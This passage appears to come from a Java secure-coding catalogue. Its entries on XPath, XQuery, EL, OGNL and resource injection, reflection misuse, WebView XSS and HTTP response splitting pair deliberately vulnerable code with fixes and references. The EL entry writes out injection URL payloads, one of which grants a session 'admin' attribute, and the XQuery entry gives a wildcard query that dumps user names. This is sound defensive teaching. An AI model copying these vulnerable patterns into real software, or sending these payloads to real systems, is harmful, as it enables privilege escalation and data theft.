  <span class="n">domFactory</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">domFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
  <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"users.xml"</span><span class="o">);</span>
  <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span> <span class="n">password</span><span class="o">);</span>

  <span class="n">XPathFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">XPathFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">XPath</span> <span class="n">xpath</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newXPath</span><span class="o">();</span>
  <span class="n">XPathExpression</span> <span class="n">expr</span> <span class="o">=</span> <span class="n">xpath</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"//users/user[username/text()='"</span> <span class="o">+</span>
       <span class="n">userName</span> <span class="o">+</span> <span class="s">"' and password/text()='"</span> <span class="o">+</span> <span class="n">pwd</span> <span class="o">+</span> <span class="s">"' ]"</span><span class="o">);</span>
  <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="na">evaluate</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">XPathConstants</span><span class="o">.</span><span class="na">NODESET</span><span class="o">);</span>
  <span class="n">NodeList</span> <span class="n">nodes</span> <span class="o">=</span> <span class="o">(</span><span class="n">NodeList</span><span class="o">)</span> <span class="n">result</span><span class="o">;</span>

  <span class="c1">// Print first names to the console</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">1</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span> <span class="s">"Authenticated: "</span> <span class="o">+</span> <span class="n">node</span><span class="o">.</span><span class="na">getNodeValue</span><span class="o">());</span>
  <span class="o">}</span>

  <span class="k">return</span> <span class="o">(</span><span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a query specified in a text file by reading the file in the required format and then inserting values for the user name and password in a Map. The XQuery library constructs the XML query from these inputs:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">doLogin</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="n">String</span> <span class="n">pwd</span><span class="o">)</span>
  <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">XPathExpressionException</span> <span class="o">{</span>

  <span class="n">DocumentBuilderFactory</span> <span class="n">domFactory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">domFactory</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">domFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
  <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"users.xml"</span><span class="o">);</span>

  <span class="n">XQuery</span> <span class="n">xquery</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XQueryFactory</span><span class="o">().</span><span class="na">createXQuery</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"login.xq"</span><span class="o">));</span>
  <span class="n">Map</span> <span class="n">queryVars</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
  <span class="n">queryVars</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"userName"</span><span class="o">,</span> <span class="n">userName</span><span class="o">);</span>
  <span class="n">queryVars</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
  <span class="n">NodeList</span> <span class="n">nodes</span> <span class="o">=</span> <span class="n">xquery</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">queryVars</span><span class="o">).</span><span class="na">toNodes</span><span class="o">();</span>

  <span class="c1">// Print first names to the console</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">1</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">node</span><span class="o">.</span><span class="na">getNodeValue</span><span class="o">());</span>
  <span class="o">}</span>

  <span class="k">return</span> <span class="o">(</span><span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS53-J.+Prevent+XPath+Injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1079">Access Specifier Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Reflection enables a Java program to analyze and modify itself. In particular, a program can discover the values of field variables that are normally inaccessible to be accessed and change them.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Use of reflection complicates security analysis and can easily introduce security vulnerabilities. Consequently, programmers should avoid using the reflection APIs when it is feasible to do so. Exercise extreme caution when the use of reflection is necessary.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Reflection must not be used to provide access to classes, methods, and fields unless those items are already accessible without the use of reflection. For example, the use of reflection to access or modify fields is not allowed unless those fields are already accessible and modifiable by other means, such as through getter and setter methods.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">id</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setObjectId</span><span class="o">(</span><span class="n">Example</span> <span class="n">example</span><span class="o">,</span> <span class="kt">int</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">example</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"id"</span><span class="o">);</span>
            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="n">field</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">example</span><span class="o">,</span> <span class="n">id</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">id</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setId</span><span class="o">(</span><span class="kt">int</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">id</span> <span class="o">=</span> <span class="n">id</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setObjectId</span><span class="o">(</span><span class="n">Example</span> <span class="n">example</span><span class="o">,</span> <span class="kt">int</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">example</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE264">
<p>https://cwe.mitre.org/data/definitions/264.html <a class="footnote-backref" href="#fnref-CWE264" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT-SEC05-JAVA">
<p>https://wiki.sei.cmu.edu/confluence/display/java/SEC05-J.+Do+not+use+reflection+to+increase+accessibility+of+classes%2C+methods%2C+or+fields <a class="footnote-backref" href="#fnref-CERT-SEC05-JAVA" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A6">
<p>https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration <a class="footnote-backref" href="#fnref-OWASP-A6" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7579">WebView with JavaScript enabled (Android)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>WebView with JavaScript enabled (Android)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Enabling JavaScript for the WebView means that it is now susceptible to XSS. The page render should be inspected
    for potential reflected XSS, stored XSS and DOM XSS.<br/>
<pre>
WebView myWebView = (WebView) findViewById(R.id.webView);
WebSettings webSettings = myWebView.getSettings();
webSettings.setJavaScriptEnabled(true);
</pre>
</p></p>
<p>
<b>Code at risk:</b><br/>
Enabling JavaScript is not a bad practice. It just means that the backend code need to be audited for potential XSS.
The XSS can also be introduce client-side with DOM XSS.
<pre>
function updateDescription(newDescription) {
    $("#userDescription").html("&lt;p&gt;"+newDescription+"&lt;/p&gt;");
}
</pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="http://www.technotalkative.com/issue-using-setjavascriptenabled-can-introduce-xss-vulnerabilities-application-review-carefully/">Issue: Using setJavaScriptEnabled can introduce XSS vulnerabilities</a><br/>
<a href="http://developer.android.com/guide/webapps/webview.html#UsingJavaScript">Android Official Doc: WebView</a><br/>
<a href="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting">WASC-8: Cross Site Scripting</a><br/>
<a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">OWASP: XSS Prevention Cheat Sheet</a><br/>
<a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_%28XSS%29">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br/>
<a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7572">Potential HTTP Response Splitting</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential HTTP Response Splitting</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    When an HTTP request contains unexpected CR and LF characters, the server may respond with an output stream
    that is interpreted as two different HTTP responses (instead of one).
    An attacker can control the second response and mount attacks such as cross-site scripting and cache poisoning attacks.
    According to OWASP, the issue has been fixed in virtually all modern Java EE application servers, but it is still better to validate the input.
    If you are concerned about this risk, you should test on the platform of concern to see
    if the underlying platform allows for CR or LF characters to be injected into headers.
    This weakness is reported with lower priority than SQL injection etc.,
    if you are using a vulnerable platform, please check low-priority warnings too.
</p>
<br/>
<p>
<b>Code at risk:</b><br/>
<pre>String author = request.getParameter(AUTHOR_PARAMETER);
// ...
Cookie cookie = new Cookie("author", author);
response.addCookie(cookie);</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://www.owasp.org/index.php/HTTP_Response_Splitting">OWASP: HTTP Response Splitting</a><br/>
<a href="http://cwe.mitre.org/data/definitions/113.html">CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')</a>
<a href="http://cwe.mitre.org/data/definitions/93.html">CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1095">XQuery Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Use parameterized queries.</p>
</li>
<li>
<p>Properly validate user input.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>doc(accounts.xml)//user[Name='*']
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<p>[^capec]： https://capec.mitre.org/data/definitions/84.html</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1100">Expression Language Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software constructs all or part of an expression language (EL) statement in a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>With EL implementations prior to 2.2, attacker can recover sensitive server side information available through implicit objects. This includes model objects, beans, session scope, application scope, etc. The EL 2.2 spec allows method invocation, which permits an attacker to execute arbitrary code within context of the application. This can manipulate application functionality, expose sensitive data, and branch out into system code access.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The Spring Message tag will double resolve Expression Language. A common pattern of passing URL parameters to the message tag is:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span><span class="o">=</span><span class="s">"/"</span><span class="o">)</span>
   <span class="n">String</span> <span class="nf">index</span><span class="o">()</span> <span class="o">{</span>

    <span class="k">if</span> <span class="o">(</span> <span class="n">hasErrors</span><span class="o">()</span> <span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"redirect:/error?msg=error.generic"</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"index"</span><span class="o">;</span>
    <span class="o">}</span>

   <span class="o">}</span>
</pre></div>
</td></tr></table>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;spring:message</span> <span class="na">code=</span><span class="s">"${param.msg}"</span> <span class="nt">/&gt;</span>
</pre></div>
</td></tr></table>
<p>A URL request to the above code of the form:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>?msg=<span class="cp">${</span><span class="n">param</span><span class="o">.</span><span class="n">test</span><span class="cp">}</span><span class="err">&amp;</span>test=INJECTION
</pre></div>
</td></tr></table>
<p>will result in the string literal "INJECTION" being passed to the message tag. The application should respond with an exception like:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>No message found under code 'INJECTION' for locale 'en_US'
</pre></div>
</td></tr></table>
<p>Accordingly, the attacker could submit methods within the EL like:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>?msg=<span class="cp">${</span><span class="n">pageContext</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">getSession</span><span class="p">()</span><span class="o">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span><span class="n">true</span><span class="p">)</span><span class="cp">}</span>
</pre></div>
</td></tr></table>
<p>If the container provided EL interpreter does not support static class methods (java.lang.Runtime.getCurrentRuntime().exec()), an attacker can use a URLClassLoader to load remote code.</p>
<h1 id="references">References</h1>
<p>[^owasp] https://www.owasp.org/index.php/Expression_Language_Injection</p>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/917.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7571">Potential code injection when using OGNL expression</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential code injection when using OGNL expression</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    A expression is built with a dynamic value. The source of the value(s) should be verified to avoid
    that unfiltered values fall into this risky code evaluation.
</p>
<p><b>Code at risk:</b></p>
<p>
<pre>
public void getUserProperty(String property) {
  [...]
  //The first argument is the dynamic expression.
  return ognlUtil.getValue("user."+property, ctx, root, String.class);
}
</pre>
</p>
<p><b>Solution:</b></p>
<p>
In general, method evaluating OGNL expression should not received user input. It is intented to be used in static configurations and JSP.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://community.saas.hpe.com/t5/Security-Research/Struts-2-OGNL-Expression-Injections/ba-p/288881">HP Enterprise: Struts 2 OGNL Expression Injections by Alvaro MuÃ±oz</a><br/>
<a href="https://blog.gdssecurity.com/labs/2017/3/27/an-analysis-of-cve-2017-5638.html">Gotham Digital Science: An Analysis Of CVE-2017-5638</a><br/>
<a href="http://struts.apache.org/docs/s2-016.html">Apache Struts2: Vulnerability S2-016</a><br/>
<a href="https://struts.apache.org/docs/ognl.html">Apache Struts 2 Documentation: OGNL</a><br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1076">Resource Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Unintended modification or specification of a resource.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Ensure all input content that is delivered to client is sanitized against an acceptable content specification.</p>
</li>
<li>
<p>Perform input validation for all content.</p>
</li>
<li>
<p>Enforce regular patching of software.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following examples represent an application which gets a port number from an HTTP request and creates a socket with this port number without any validation. A user using a proxy can modify this port and obtain a direct connection (socket) with the server. </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">rPort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"remotePort"</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">ServerSocket</span> <span class="n">srvr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServerSocket</span><span class="o">(</span><span class="n">rPort</span><span class="o">);</span>
<span class="n">Socket</span> <span class="n">skt</span> <span class="o">=</span> <span class="n">srvr</span><span class="o">.</span><span class="na">accept</span><span class="o">();</span> 
<span class="o">...</span>
